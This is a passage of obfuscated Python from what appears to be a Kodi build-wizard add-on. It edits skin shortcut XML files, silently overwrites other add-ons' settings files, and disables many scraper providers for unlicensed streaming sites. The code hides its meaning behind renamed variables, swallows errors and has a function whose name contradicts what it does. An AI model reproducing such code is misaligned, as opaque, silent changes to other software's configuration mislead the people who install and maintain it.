		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1234
    with open (OO0O0OO0OOOO00O00 ,'w')as OOO0000OOOOO0O0OO :#line:1237
      OOO0000OOOOO0O0OO .write (OO0000O0OOOO00OOO )#line:1238
    OO0O0OO0OOOO00O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1242
    with open (OO0O0OO0OOOO00O00 ,'r')as OOO0000OOOOO0O0OO :#line:1243
      OO0000O0OOOO00OOO =OOO0000OOOOO0O0OO .read ()#line:1244
    OO0000O0OOOO00OOO =OO0000O0OOOO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1262
    with open (OO0O0OO0OOOO00O00 ,'w')as OOO0000OOOOO0O0OO :#line:1265
      OOO0000OOOOO0O0OO .write (OO0000O0OOOO00OOO )#line:1266
    OO0O0OO0OOOO00O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1270
    with open (OO0O0OO0OOOO00O00 ,'r')as OOO0000OOOOO0O0OO :#line:1271
      OO0000O0OOOO00OOO =OOO0000OOOOO0O0OO .read ()#line:1272
    OO0000O0OOOO00OOO =OO0000O0OOOO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1290
    with open (OO0O0OO0OOOO00O00 ,'w')as OOO0000OOOOO0O0OO :#line:1293
      OOO0000OOOOO0O0OO .write (OO0000O0OOOO00OOO )#line:1294
    OO0O0OO0OOOO00O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1297
    with open (OO0O0OO0OOOO00O00 ,'r')as OOO0000OOOOO0O0OO :#line:1298
      OO0000O0OOOO00OOO =OOO0000OOOOO0O0OO .read ()#line:1299
    OO0000O0OOOO00OOO =OO0000O0OOOO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1317
    with open (OO0O0OO0OOOO00O00 ,'w')as OOO0000OOOOO0O0OO :#line:1320
      OOO0000OOOOO0O0OO .write (OO0000O0OOOO00OOO )#line:1321
    OO0O0OO0OOOO00O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1323
    with open (OO0O0OO0OOOO00O00 ,'r')as OOO0000OOOOO0O0OO :#line:1324
      OO0000O0OOOO00OOO =OOO0000OOOOO0O0OO .read ()#line:1325
    OO0000O0OOOO00OOO =OO0000O0OOOO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1343
    with open (OO0O0OO0OOOO00O00 ,'w')as OOO0000OOOOO0O0OO :#line:1346
      OOO0000OOOOO0O0OO .write (OO0000O0OOOO00OOO )#line:1347
    OO0O0OO0OOOO00O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1349
    with open (OO0O0OO0OOOO00O00 ,'r')as OOO0000OOOOO0O0OO :#line:1350
      OO0000O0OOOO00OOO =OOO0000OOOOO0O0OO .read ()#line:1351
    OO0000O0OOOO00OOO =OO0000O0OOOO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1369
    with open (OO0O0OO0OOOO00O00 ,'w')as OOO0000OOOOO0O0OO :#line:1372
      OOO0000OOOOO0O0OO .write (OO0000O0OOOO00OOO )#line:1373
    OO0O0OO0OOOO00O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1376
    with open (OO0O0OO0OOOO00O00 ,'r')as OOO0000OOOOO0O0OO :#line:1377
      OO0000O0OOOO00OOO =OOO0000OOOOO0O0OO .read ()#line:1378
    OO0000O0OOOO00OOO =OO0000O0OOOO00OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1396
    with open (OO0O0OO0OOOO00O00 ,'w')as OOO0000OOOOO0O0OO :#line:1399
      OOO0000OOOOO0O0OO .write (OO0000O0OOOO00OOO )#line:1400
def rdbuildinstallON ():#line:1403
    try :#line:1405
       O0O0OO0O0000O0O00 =ADDONPATH +"/resources/rd/victory.xml"#line:1406
       OOOO0O0O000O0OO0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1407
       copyfile (O0O0OO0O0000O0O00 ,OOOO0O0O000O0OO0O )#line:1409
       O0O0OO0O0000O0O00 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1411
       OOOO0O0O000O0OO0O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1412
       copyfile (O0O0OO0O0000O0O00 ,OOOO0O0O000O0OO0O )#line:1414
       O0O0OO0O0000O0O00 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1416
       OOOO0O0O000O0OO0O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1417
       copyfile (O0O0OO0O0000O0O00 ,OOOO0O0O000O0OO0O )#line:1419
       O0O0OO0O0000O0O00 =ADDONPATH +"/resources/rd/Splash.png"#line:1422
       OOOO0O0O000O0OO0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1423
       copyfile (O0O0OO0O0000O0O00 ,OOOO0O0O000O0OO0O )#line:1425
    except :#line:1427
       pass #line:1428
def rdbuild ():#line:1438
	OO00OOO00OOOOOO00 =(ADDON .getSetting ("auto_rd"))#line:1439
	if OO00OOO00OOOOOO00 =='true':#line:1440
		OOO0OOOO0O0O000OO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1441
		OOO0OOOO0O0O000OO .setSetting ('all_t','0')#line:1442
		OOO0OOOO0O0O000OO .setSetting ('rd_menu_enable','false')#line:1443
		OOO0OOOO0O0O000OO .setSetting ('magnet_bay','false')#line:1444
		OOO0OOOO0O0O000OO .setSetting ('magnet_extra','false')#line:1445
		OOO0OOOO0O0O000OO .setSetting ('rd_only','false')#line:1446
		OOO0OOOO0O0O000OO .setSetting ('ftp','false')#line:1448
		OOO0OOOO0O0O000OO .setSetting ('fp','false')#line:1449
		OOO0OOOO0O0O000OO .setSetting ('filter_fp','false')#line:1450
		OOO0OOOO0O0O000OO .setSetting ('fp_size_en','false')#line:1451
		OOO0OOOO0O0O000OO .setSetting ('afdah','false')#line:1452
		OOO0OOOO0O0O000OO .setSetting ('ap2s','false')#line:1453
		OOO0OOOO0O0O000OO .setSetting ('cin','false')#line:1454
		OOO0OOOO0O0O000OO .setSetting ('clv','false')#line:1455
		OOO0OOOO0O0O000OO .setSetting ('cmv','false')#line:1456
		OOO0OOOO0O0O000OO .setSetting ('dl20','false')#line:1457
		OOO0OOOO0O0O000OO .setSetting ('esc','false')#line:1458
		OOO0OOOO0O0O000OO .setSetting ('extra','false')#line:1459
		OOO0OOOO0O0O000OO .setSetting ('film','false')#line:1460
		OOO0OOOO0O0O000OO .setSetting ('fre','false')#line:1461
		OOO0OOOO0O0O000OO .setSetting ('fxy','false')#line:1462
		OOO0OOOO0O0O000OO .setSetting ('genv','false')#line:1463
		OOO0OOOO0O0O000OO .setSetting ('getgo','false')#line:1464
		OOO0OOOO0O0O000OO .setSetting ('gold','false')#line:1465
		OOO0OOOO0O0O000OO .setSetting ('gona','false')#line:1466
		OOO0OOOO0O0O000OO .setSetting ('hdmm','false')#line:1467
		OOO0OOOO0O0O000OO .setSetting ('hdt','false')#line:1468
		OOO0OOOO0O0O000OO .setSetting ('icy','false')#line:1469
		OOO0OOOO0O0O000OO .setSetting ('ind','false')#line:1470
		OOO0OOOO0O0O000OO .setSetting ('iwi','false')#line:1471
		OOO0OOOO0O0O000OO .setSetting ('jen_free','false')#line:1472
		OOO0OOOO0O0O000OO .setSetting ('kiss','false')#line:1473
		OOO0OOOO0O0O000OO .setSetting ('lavin','false')#line:1474
		OOO0OOOO0O0O000OO .setSetting ('los','false')#line:1475
		OOO0OOOO0O0O000OO .setSetting ('m4u','false')#line:1476
		OOO0OOOO0O0O000OO .setSetting ('mesh','false')#line:1477
		OOO0OOOO0O0O000OO .setSetting ('mf','false')#line:1478
		OOO0OOOO0O0O000OO .setSetting ('mkvc','false')#line:1479
		OOO0OOOO0O0O000OO .setSetting ('mjy','false')#line:1480
		OOO0OOOO0O0O000OO .setSetting ('hdonline','false')#line:1481
		OOO0OOOO0O0O000OO .setSetting ('moviex','false')#line:1482
		OOO0OOOO0O0O000OO .setSetting ('mpr','false')#line:1483
		OOO0OOOO0O0O000OO .setSetting ('mvg','false')#line:1484
		OOO0OOOO0O0O000OO .setSetting ('mvl','false')#line:1485
		OOO0OOOO0O0O000OO .setSetting ('mvs','false')#line:1486
		OOO0OOOO0O0O000OO .setSetting ('myeg','false')#line:1487
		OOO0OOOO0O0O000OO .setSetting ('ninja','false')#line:1488
		OOO0OOOO0O0O000OO .setSetting ('odb','false')#line:1489
		OOO0OOOO0O0O000OO .setSetting ('ophd','false')#line:1490
		OOO0OOOO0O0O000OO .setSetting ('pks','false')#line:1491
		OOO0OOOO0O0O000OO .setSetting ('prf','false')#line:1492
		OOO0OOOO0O0O000OO .setSetting ('put18','false')#line:1493
		OOO0OOOO0O0O000OO .setSetting ('req','false')#line:1494
		OOO0OOOO0O0O000OO .setSetting ('rftv','false')#line:1495
		OOO0OOOO0O0O000OO .setSetting ('rltv','false')#line:1496
		OOO0OOOO0O0O000OO .setSetting ('sc','false')#line:1497
		OOO0OOOO0O0O000OO .setSetting ('seehd','false')#line:1498
		OOO0OOOO0O0O000OO .setSetting ('showbox','false')#line:1499
		OOO0OOOO0O0O000OO .setSetting ('shuid','false')#line:1500
		OOO0OOOO0O0O000OO .setSetting ('sil_gh','false')#line:1501
		OOO0OOOO0O0O000OO .setSetting ('spv','false')#line:1502
		OOO0OOOO0O0O000OO .setSetting ('subs','false')#line:1503
		OOO0OOOO0O0O000OO .setSetting ('tvs','false')#line:1504
		OOO0OOOO0O0O000OO .setSetting ('tw','false')#line:1505
		OOO0OOOO0O0O000OO .setSetting ('upto','false')#line:1506
		OOO0OOOO0O0O000OO .setSetting ('vel','false')#line:1507
		OOO0OOOO0O0O000OO .setSetting ('vex','false')#line:1508
		OOO0OOOO0O0O000OO .setSetting ('vidc','false')#line:1509
		OOO0OOOO0O0O000OO .setSetting ('w4hd','false')#line:1510
		OOO0OOOO0O0O000OO .setSetting ('wav','false')#line:1511
		OOO0OOOO0O0O000OO .setSetting ('wf','false')#line:1512
		OOO0OOOO0O0O000OO .setSetting ('wse','false')#line:1513
		OOO0OOOO0O0O000OO .setSetting ('wss','false')#line:1514
		OOO0OOOO0O0O000OO .setSetting ('wsse','false')#line:1515
		OOO0OOOO0O0O000OO =xbmcaddon .Addon ('plugin.video.speedmax')#line:1516
		OOO0OOOO0O0O000OO .setSetting ('debrid.only','true')#line:1517
		OOO0OOOO0O0O000OO .setSetting ('hosts.captcha','false')#line:1518
		OOO0OOOO0O0O000OO =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1519
		OOO0OOOO0O0O000OO .setSetting ('provider.123moviehd','false')#line:1520
		OOO0OOOO0O0O000OO .setSetting ('provider.300mbdownload','false')#line:1521
		OOO0OOOO0O0O000OO .setSetting ('provider.alltube','false')#line:1522
		OOO0OOOO0O0O000OO .setSetting ('provider.allucde','false')#line:1523
		OOO0OOOO0O0O000OO .setSetting ('provider.animebase','false')#line:1524
		OOO0OOOO0O0O000OO .setSetting ('provider.animeloads','false')#line:1525
		OOO0OOOO0O0O000OO .setSetting ('provider.animetoon','false')#line:1526
		OOO0OOOO0O0O000OO .setSetting ('provider.bnwmovies','false')#line:1527
		OOO0OOOO0O0O000OO .setSetting ('provider.boxfilm','false')#line:1528
		OOO0OOOO0O0O000OO .setSetting ('provider.bs','false')#line:1529
		OOO0OOOO0O0O000OO .setSetting ('provider.cartoonhd','false')#line:1530
		OOO0OOOO0O0O000OO .setSetting ('provider.cdahd','false')#line:1531
		OOO0OOOO0O0O000OO .setSetting ('provider.cdax','false')#line:1532
		OOO0OOOO0O0O000OO .setSetting ('provider.cine','false')#line:1533
		OOO0OOOO0O0O000OO .setSetting ('provider.cinenator','false')#line:1534
		OOO0OOOO0O0O000OO .setSetting ('provider.cmovieshdbz','false')#line:1535
		OOO0OOOO0O0O000OO .setSetting ('provider.coolmoviezone','false')#line:1536
		OOO0OOOO0O0O000OO .setSetting ('provider.ddl','false')#line:1537
		OOO0OOOO0O0O000OO .setSetting ('provider.deepmovie','false')#line:1538
		OOO0OOOO0O0O000OO .setSetting ('provider.ekinomaniak','false')#line:1539
		OOO0OOOO0O0O000OO .setSetting ('provider.ekinotv','false')#line:1540
		OOO0OOOO0O0O000OO .setSetting ('provider.filiser','false')#line:1541
		OOO0OOOO0O0O000OO .setSetting ('provider.filmpalast','false')#line:1542
		OOO0OOOO0O0O000OO .setSetting ('provider.filmwebbooster','false')#line:1543
		OOO0OOOO0O0O000OO .setSetting ('provider.filmxy','false')#line:1544
		OOO0OOOO0O0O000OO .setSetting ('provider.fmovies','false')#line:1545
		OOO0OOOO0O0O000OO .setSetting ('provider.foxx','false')#line:1546
		OOO0OOOO0O0O000OO .setSetting ('provider.freefmovies','false')#line:1547
		OOO0OOOO0O0O000OO .setSetting ('provider.freeputlocker','false')#line:1548
		OOO0OOOO0O0O000OO .setSetting ('provider.furk','false')#line:1549
		OOO0OOOO0O0O000OO .setSetting ('provider.gamatotv','false')#line:1550
		OOO0OOOO0O0O000OO .setSetting ('provider.gogoanime','false')#line:1551
		OOO0OOOO0O0O000OO .setSetting ('provider.gowatchseries','false')#line:1552
		OOO0OOOO0O0O000OO .setSetting ('provider.hackimdb','false')#line:1553
		OOO0OOOO0O0O000OO .setSetting ('provider.hdfilme','false')#line:1554
		OOO0OOOO0O0O000OO .setSetting ('provider.hdmto','false')#line:1555
		OOO0OOOO0O0O000OO .setSetting ('provider.hdpopcorns','false')#line:1556
		OOO0OOOO0O0O000OO .setSetting ('provider.hdstreams','false')#line:1557
		OOO0OOOO0O0O000OO .setSetting ('provider.horrorkino','false')#line:1559
		OOO0OOOO0O0O000OO .setSetting ('provider.iitv','false')#line:1560
		OOO0OOOO0O0O000OO .setSetting ('provider.iload','false')#line:1561
		OOO0OOOO0O0O000OO .setSetting ('provider.iwaatch','false')#line:1562
		OOO0OOOO0O0O000OO .setSetting ('provider.kinodogs','false')#line:1563
		OOO0OOOO0O0O000OO .setSetting ('provider.kinoking','false')#line:1564
		OOO0OOOO0O0O000OO .setSetting ('provider.kinow','false')#line:1565
		OOO0OOOO0O0O000OO .setSetting ('provider.kinox','false')#line:1566
		OOO0OOOO0O0O000OO .setSetting ('provider.lichtspielhaus','false')#line:1567
		OOO0OOOO0O0O000OO .setSetting ('provider.liomenoi','false')#line:1568
		OOO0OOOO0O0O000OO .setSetting ('provider.magnetdl','false')#line:1571
		OOO0OOOO0O0O000OO .setSetting ('provider.megapelistv','false')#line:1572
		OOO0OOOO0O0O000OO .setSetting ('provider.movie2k-ac','false')#line:1573
		OOO0OOOO0O0O000OO .setSetting ('provider.movie2k-ag','false')#line:1574
		OOO0OOOO0O0O000OO .setSetting ('provider.movie2z','false')#line:1575
		OOO0OOOO0O0O000OO .setSetting ('provider.movie4k','false')#line:1576
		OOO0OOOO0O0O000OO .setSetting ('provider.movie4kis','false')#line:1577
		OOO0OOOO0O0O000OO .setSetting ('provider.movieneo','false')#line:1578
		OOO0OOOO0O0O000OO .setSetting ('provider.moviesever','false')#line:1579
		OOO0OOOO0O0O000OO .setSetting ('provider.movietown','false')#line:1580
		OOO0OOOO0O0O000OO .setSetting ('provider.mvrls','false')#line:1582
		OOO0OOOO0O0O000OO .setSetting ('provider.netzkino','false')#line:1583
		OOO0OOOO0O0O000OO .setSetting ('provider.odb','false')#line:1584
		OOO0OOOO0O0O000OO .setSetting ('provider.openkatalog','false')#line:1585
		OOO0OOOO0O0O000OO .setSetting ('provider.ororo','false')#line:1586
		OOO0OOOO0O0O000OO .setSetting ('provider.paczamy','false')#line:1587
		OOO0OOOO0O0O000OO .setSetting ('provider.peliculasdk','false')#line:1588
		OOO0OOOO0O0O000OO .setSetting ('provider.pelisplustv','false')#line:1589
		OOO0OOOO0O0O000OO .setSetting ('provider.pepecine','false')#line:1590
		OOO0OOOO0O0O000OO .setSetting ('provider.primewire','false')#line:1591
		OOO0OOOO0O0O000OO .setSetting ('provider.projectfreetv','false')#line:1592
		OOO0OOOO0O0O000OO .setSetting ('provider.proxer','false')#line:1593
		OOO0OOOO0O0O000OO .setSetting ('provider.pureanime','false')#line:1594
		OOO0OOOO0O0O000OO .setSetting ('provider.putlocker','false')#line:1595
		OOO0OOOO0O0O000OO .setSetting ('provider.putlockerfree','false')#line:1596
		OOO0OOOO0O0O000OO .setSetting ('provider.reddit','false')#line:1597
		OOO0OOOO0O0O000OO .setSetting ('provider.cartoonwire','false')#line:1598
		OOO0OOOO0O0O000OO .setSetting ('provider.seehd','false')#line:1599
		OOO0OOOO0O0O000OO .setSetting ('provider.segos','false')#line:1600
		OOO0OOOO0O0O000OO .setSetting ('provider.serienstream','false')#line:1601
		OOO0OOOO0O0O000OO .setSetting ('provider.series9','false')#line:1602
		OOO0OOOO0O0O000OO .setSetting ('provider.seriesever','false')#line:1603
		OOO0OOOO0O0O000OO .setSetting ('provider.seriesonline','false')#line:1604
		OOO0OOOO0O0O000OO .setSetting ('provider.seriespapaya','false')#line:1605
		OOO0OOOO0O0O000OO .setSetting ('provider.sezonlukdizi','false')#line:1606
		OOO0OOOO0O0O000OO .setSetting ('provider.solarmovie','false')#line:1607
		OOO0OOOO0O0O000OO .setSetting ('provider.solarmoviez','false')#line:1608
		OOO0OOOO0O0O000OO .setSetting ('provider.stream-to','false')#line:1609
		OOO0OOOO0O0O000OO .setSetting ('provider.streamdream','false')#line:1610
		OOO0OOOO0O0O000OO .setSetting ('provider.streamflix','false')#line:1611
		OOO0OOOO0O0O000OO .setSetting ('provider.streamit','false')#line:1612
		OOO0OOOO0O0O000OO .setSetting ('provider.swatchseries','false')#line:1613
		OOO0OOOO0O0O000OO .setSetting ('provider.szukajkatv','false')#line:1614
		OOO0OOOO0O0O000OO .setSetting ('provider.tainiesonline','false')#line:1615
		OOO0OOOO0O0O000OO .setSetting ('provider.tainiomania','false')#line:1616
		OOO0OOOO0O0O000OO .setSetting ('provider.tata','false')#line:1619
		OOO0OOOO0O0O000OO .setSetting ('provider.trt','false')#line:1620
		OOO0OOOO0O0O000OO .setSetting ('provider.tvbox','false')#line:1621
		OOO0OOOO0O0O000OO .setSetting ('provider.ultrahd','false')#line:1622
		OOO0OOOO0O0O000OO .setSetting ('provider.video4k','false')#line:1623
		OOO0OOOO0O0O000OO .setSetting ('provider.vidics','false')#line:1624
		OOO0OOOO0O0O000OO .setSetting ('provider.view4u','false')#line:1625
		OOO0OOOO0O0O000OO .setSetting ('provider.watchseries','false')#line:1626
		OOO0OOOO0O0O000OO .setSetting ('provider.xrysoi','false')#line:1627
		OOO0OOOO0O0O000OO .setSetting ('provider.library','false')#line:1628
def fixfont ():#line:1631
	O0000OO00O00OOO0O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1632
	O000OOOO000OO0OO0 =json .loads (O0000OO00O00OOO0O );#line:1634
	O00OO0O00OOOO00O0 =O000OOOO000OO0OO0 ["result"]["settings"]#line:1635
	O0O00O0O00O000OOO =[O0OO0O00O00OO0OO0 for O0OO0O00O00OO0OO0 in O00OO0O00OOOO00O0 if O0OO0O00O00OO0OO0 ["id"]=="audiooutput.audiodevice"][0 ]#line:1637
	OOO00O0OO0OO00O00 =O0O00O0O00O000OOO ["options"];#line:1638
	O00O0OO000OOO0O00 =O0O00O0O00O000OOO ["value"];#line:1639
	O00O0000OOO00O00O =[OOOOO0OOO0OO000O0 for (OOOOO0OOO0OO000O0 ,O000OOOO00OO0O000 )in enumerate (OOO00O0OO0OO00O00 )if O000OOOO00OO0O000 ["value"]==O00O0OO000OOO0O00 ][0 ];#line:1641
	O0OO0OO0O0OOOO0O0 =(O00O0000OOO00O00O +1 )%len (OOO00O0OO0OO00O00 )#line:1643
	OO0OOO0O0O00O0000 =OOO00O0OO0OO00O00 [O0OO0OO0O0OOOO0O0 ]["value"]#line:1645
	O0000O0000OOO0OOO =OOO00O0OO0OO00O00 [O0OO0OO0O0OOOO0O0 ]["label"]#line:1646
	O00O00OOOOOO0O0OO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1648
	try :#line:1650
		OOO0000OO00OOOO00 =json .loads (O00O00OOOOOO0O0OO );#line:1651
		if OOO0000OO00OOOO00 ["result"]!=True :#line:1653
			raise Exception #line:1654
	except :#line:1655
		sys .stderr .write ("Error switching audio output device")#line:1656
		raise Exception #line:1657
def parseDOM2 (OOO00OOO000OOO00O ,name =u"",attrs ={},ret =False ):#line:1658
	if isinstance (OOO00OOO000OOO00O ,str ):#line:1661
		try :#line:1662
			OOO00OOO000OOO00O =[OOO00OOO000OOO00O .decode ("utf-8")]#line:1663
		except :#line:1664
			OOO00OOO000OOO00O =[OOO00OOO000OOO00O ]#line:1665
	elif isinstance (OOO00OOO000OOO00O ,unicode ):#line:1666
		OOO00OOO000OOO00O =[OOO00OOO000OOO00O ]#line:1667
	elif not isinstance (OOO00OOO000OOO00O ,list ):#line:1668
		return u""#line:1669
	if not name .strip ():#line:1671
		return u""#line:1672
	OO0OO0000O0OO00O0 =[]#line:1674
	for O0OO0O00OOOO00OO0 in OOO00OOO000OOO00O :#line:1675
		O00OOO00OOOO0000O =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O0OO0O00OOOO00OO0 )#line:1676
		for OO00O0O0O0O0O0OOO in O00OOO00OOOO0000O :#line:1677
			O0OO0O00OOOO00OO0 =O0OO0O00OOOO00OO0 .replace (OO00O0O0O0O0O0OOO ,OO00O0O0O0O0O0OOO .replace ("\n"," "))#line:1678
		O0000OOOOOOOOO000 =[]#line:1680
		for O000OO00O00OO00OO in attrs :#line:1681
			OOOOO0OOO00OO000O =re .compile ('(<'+name +'[^>]*?(?:'+O000OO00O00OO00OO +'=[\'"]'+attrs [O000OO00O00OO00OO ]+'[\'"].*?>))',re .M |re .S ).findall (O0OO0O00OOOO00OO0 )#line:1682
			if len (OOOOO0OOO00OO000O )==0 and attrs [O000OO00O00OO00OO ].find (" ")==-1 :#line:1683
				OOOOO0OOO00OO000O =re .compile ('(<'+name +'[^>]*?(?:'+O000OO00O00OO00OO +'='+attrs [O000OO00O00OO00OO ]+'.*?>))',re .M |re .S ).findall (O0OO0O00OOOO00OO0 )#line:1684
			if len (O0000OOOOOOOOO000 )==0 :#line:1686
				O0000OOOOOOOOO000 =OOOOO0OOO00OO000O #line:1687
				OOOOO0OOO00OO000O =[]#line:1688
			else :#line:1689
				O0OOOO0OOO0OO00O0 =range (len (O0000OOOOOOOOO000 ))#line:1690
				O0OOOO0OOO0OO00O0 .reverse ()#line:1691
				for OOOOO0O0000OOOO00 in O0OOOO0OOO0OO00O0 :#line:1692
					if not O0000OOOOOOOOO000 [OOOOO0O0000OOOO00 ]in OOOOO0OOO00OO000O :#line:1693
						del (O0000OOOOOOOOO000 [OOOOO0O0000OOOO00 ])#line:1694
		if len (O0000OOOOOOOOO000 )==0 and attrs =={}:#line:1696
			O0000OOOOOOOOO000 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O0OO0O00OOOO00OO0 )#line:1697
			if len (O0000OOOOOOOOO000 )==0 :#line:1698
				O0000OOOOOOOOO000 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O0OO0O00OOOO00OO0 )#line:1699
		if isinstance (ret ,str ):#line:1701
			OOOOO0OOO00OO000O =[]#line:1702
			for OO00O0O0O0O0O0OOO in O0000OOOOOOOOO000 :#line:1703
				O00O0OO00OO0O00OO =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OO00O0O0O0O0O0OOO )#line:1704
				if len (O00O0OO00OO0O00OO )==0 :#line:1705
					O00O0OO00OO0O00OO =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OO00O0O0O0O0O0OOO )#line:1706
				for O0OO00OOO0OO00000 in O00O0OO00OO0O00OO :#line:1707
					OO00000000O00O00O =O0OO00OOO0OO00000 [0 ]#line:1708
					if OO00000000O00O00O in "'\"":#line:1709
						if O0OO00OOO0OO00000 .find ('='+OO00000000O00O00O ,O0OO00OOO0OO00000 .find (OO00000000O00O00O ,1 ))>-1 :#line:1710
							O0OO00OOO0OO00000 =O0OO00OOO0OO00000 [:O0OO00OOO0OO00000 .find ('='+OO00000000O00O00O ,O0OO00OOO0OO00000 .find (OO00000000O00O00O ,1 ))]#line:1711
						if O0OO00OOO0OO00000 .rfind (OO00000000O00O00O ,1 )>-1 :#line:1713
							O0OO00OOO0OO00000 =O0OO00OOO0OO00000 [1 :O0OO00OOO0OO00000 .rfind (OO00000000O00O00O )]#line:1714
					else :#line:1715
						if O0OO00OOO0OO00000 .find (" ")>0 :#line:1716
							O0OO00OOO0OO00000 =O0OO00OOO0OO00000 [:O0OO00OOO0OO00000 .find (" ")]#line:1717
						elif O0OO00OOO0OO00000 .find ("/")>0 :#line:1718
